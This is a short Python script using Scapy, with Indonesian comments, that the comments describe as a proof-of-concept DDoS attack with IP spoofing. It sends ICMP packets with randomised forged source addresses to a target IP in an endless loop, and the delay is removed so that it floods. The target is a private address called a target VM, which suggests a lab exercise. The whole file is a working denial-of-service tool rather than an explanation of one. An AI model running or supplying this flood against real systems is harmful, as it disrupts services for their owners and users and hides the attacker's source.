from scapy.all import IP, ICMP, send, RandIP
import time

# Ganti dengan IP VM Target Anda
target_ip = "192.168.0.118" 

print(f"--- Memulai PoC Serangan DDoS (IP Spoofing) ke {target_ip} ---")

try:
    while True:
        # 1. Membuat paket:
        #    src=RandIP() ==> Palsukan IP sumber secara acak
        #    dst=target_ip ==> Target tetap
        #    / ICMP()      ==> Payload-nya ICMP (ping)
        packet = IP(src=RandIP(), dst=target_ip) / ICMP()

        # 2. Mengirim paket
        send(packet, verbose=0) # verbose=0 agar tidak print output ke konsol

        # Kita hilangkan time.sleep() agar serangannya cepat (flood)
        # time.sleep(1) 

except KeyboardInterrupt:
    print("\n--- Serangan dihentikan ---")

